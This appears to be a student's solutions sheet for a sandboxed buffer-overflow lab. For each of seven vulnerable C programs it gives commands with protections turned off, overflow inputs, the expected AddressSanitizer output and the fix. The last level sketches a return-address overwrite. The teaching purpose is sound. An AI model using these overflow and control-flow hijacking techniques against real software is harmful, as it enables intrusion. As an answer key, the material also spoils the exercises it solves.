# Solutions — Exploit Commands & Expected Output per Level

**Author:** Bhushan Ladgaonkar | Roll No. 10611 | TE Computer Engineering, Div A

All commands run inside the sandbox (via the browser terminal or
`docker run -it ... css-lab-boa-sandbox`), from `/opt/levels/<level>/`.

---

## 01 — gets()

```bash
gcc -g -fsanitize=address -fno-stack-protector -o /tmp/v vuln.c
echo "Bhushan" | /tmp/v                        # clean
python3 -c "print('A'*40)" | /tmp/v            # ASan stack-buffer-overflow
```
Root cause: no length argument exists for `gets()` to respect.
Fix: `fgets(buffer, sizeof(buffer), stdin)`.

## 02 — strcpy()

```bash
gcc -g -fsanitize=address -fno-stack-protector -o /tmp/v vuln.c
/tmp/v "Bhushan"                               # clean
/tmp/v "$(python3 -c "print('A'*40)")"         # ASan stack-buffer-overflow
```
Root cause: copies until a null byte, blind to destination size.
Fix: `strncpy(dest, src, sizeof(dest)-1)` + manual null-terminate.

## 03 — strcat()

```bash
gcc -g -fsanitize=address -fno-stack-protector -o /tmp/v vuln.c
/tmp/v "Bhushan"                               # clean
/tmp/v "$(python3 -c "print('A'*40)")"         # ASan, inside strcat
```
Root cause: appends with no bound on remaining capacity.
Fix: `strncat(dest, src, remaining_space)`.

## 04 — sprintf()

```bash
gcc -g -fsanitize=address -fno-stack-protector -o /tmp/v vuln.c
/tmp/v "Bhushan"                               # clean
/tmp/v "$(python3 -c "print('A'*40)")"         # ASan, inside vsprintf
```
Root cause: no limit on the formatted result's length.
Fix: `snprintf(buf, sizeof(buf), ...)`.

## 05 — memcpy() (win condition: flip access_granted)

```bash
gcc -g -fsanitize=address -fno-stack-protector -o /tmp/v vuln.c
/tmp/v "Bhushan"                               # clean, access_granted stays 0
/tmp/v "$(python3 -c "print('A'*40)")"         # ASan, inside memcpy
```
To find the exact offset that flips `access_granted` *without* tripping
ASan first (a true "silent" overflow), compile without `-fsanitize=address`
and use gdb to find the stack offset between `buffer` and `access_granted`:
```bash
gcc -g -fno-stack-protector -o /tmp/v_nosan vuln.c
gdb /tmp/v_nosan
(gdb) break vulnerable_copy
(gdb) run "test"
(gdb) print &buffer
(gdb) print &access_granted
```
Root cause: `memcpy`'s byte count comes from untrusted input, never clamped.
Fix: clamp `len` to `sizeof(buffer)-1` before copying.

## 06 — array indexing

```bash
gcc -g -fsanitize=address -o /tmp/v vuln.c
/tmp/v 3 99                                    # clean
/tmp/v 15 1                                    # ASan stack-buffer-overflow
/tmp/v -5 1                                    # ASan stack-buffer-underflow
```
Root cause: no range check on the index, positive or negative.
Fix: validate `0 <= idx < 10` before every access.

## 07 — bonus: return-address redirect

```bash
gcc -g -fno-stack-protector -fno-pie -no-pie -z execstack -o /tmp/v vuln.c
gdb /tmp/v
(gdb) disassemble vulnerable_read
(gdb) print secret_win
# locate the saved-return-address offset for THIS binary (aarch64: check
# how x30 is spilled to the stack in vulnerable_read's prologue)
```
Then craft `<offset bytes of 'A'> + <secret_win address, packed little-endian>`
as the argument. See `levels/07-bonus-redirect/expected_output.txt` for the
full payload-construction script. Offsets are architecture/compiler-specific
and must be found interactively, not copied from x86 references.

---

## Summary table

| # | Function | Trigger | Detected by |
|---|---|---|---|
| 01 | gets | 40-byte input vs 16-byte buffer | ASan READ overflow (in printf) |
| 02 | strcpy | 40-byte input vs 16-byte buffer | ASan WRITE overflow |
| 03 | strcat | concat past 20-byte buffer | ASan WRITE overflow (in strcat) |
| 04 | sprintf | long %s argument | ASan WRITE overflow (in vsprintf) |
| 05 | memcpy | unclamped length argument | ASan WRITE overflow, or silent flag flip if offset chosen precisely |
| 06 | array index | idx outside [0,10) | ASan stack-buffer-overflow / underflow |
| 07 | return address | crafted offset + address payload | secret_win() printout (no ASan — canary/PIE off by design) |
